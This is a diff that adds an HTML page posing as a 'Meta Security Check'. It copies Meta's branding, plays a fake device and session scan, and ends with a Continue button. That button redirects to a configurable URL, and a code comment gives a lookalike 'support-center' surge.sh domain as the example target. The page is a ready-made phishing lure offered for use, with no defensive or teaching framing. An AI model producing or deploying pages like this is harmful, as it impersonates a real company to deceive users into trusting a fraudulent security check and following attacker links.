@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Meta</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6ea 100%);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1c1e21;
+        }
+        .card {
+            width: 380px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
+            padding: 32px 28px;
+            text-align: center;
+            border: 1px solid #dddfe2;
+        }
+        .logo {
+            width: 72px;
+            height: 72px;
+            background: #1877f2;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 700;
+            margin: 0 auto 16px;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+        .header {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 12px 0 8px;
+        }
+        .subtext {
+            color: #65676b;
+            font-size: 15.5px;
+            line-height: 1.4;
+        }
+        .loader {
+            width: 42px;
+            height: 42px;
+            border: 5px solid #f0f2f5;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            margin: 24px auto;
+            animation: spin 1.1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status {
+            text-align: left;
+            margin: 20px 0;
+            font-size: 14.5px;
+        }
+        .status span {
+            display: block;
+            padding: 8px 0;
+            opacity: 0;
+            transition: all 0.4s ease;
+            color: #1c1e21;
+        }
+        .status span.show {
+            opacity: 1;
+        }
+        .status span::before {
+            content: "✔";
+            color: #31a24c;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: none;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12.5px;
+            color: #90949c;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">M</div>
+        <div class="header">Meta Security Check</div>
+        <p class="subtext">We need to verify your identity to keep your account secure.</p>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="status">
+            <span id="step1">Initializing security system...</span>
+            <span id="step2">Scanning device and browser...</span>
+            <span id="step3">Verifying connection and session...</span>
+            <span id="step4">Verification completed successfully</span>
+        </div>
+
+        <button id="continueBtn" onclick="goNext()">Continue</button>
+        
+        <div class="footer">
+            Protected by Meta Secure System • <span style="color:#1877f2;">Learn more</span>
+        </div>
+    </div>
+
+    <script>
+        const steps = ["step1", "step2", "step3", "step4"];
+        let current = 0;
+
+        function runSteps() {
+            if (current < steps.length) {
+                document.getElementById(steps[current]).classList.add("show");
+                current++;
+                setTimeout(runSteps, 850);
+            } else {
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("continueBtn").style.display = "block";
+            }
+        }
+
+        // Start the animation
+        window.onload = runSteps;
+
+        function goNext() {
+            // Change this URL to wherever you want to redirect
+            window.location.href = "https://your-actual-link-here.com";
+            // Example: window.location.href = "http://support-center-solve-issues-u.surge.sh/";
+        }
+    </script>
+</body>
+</html>
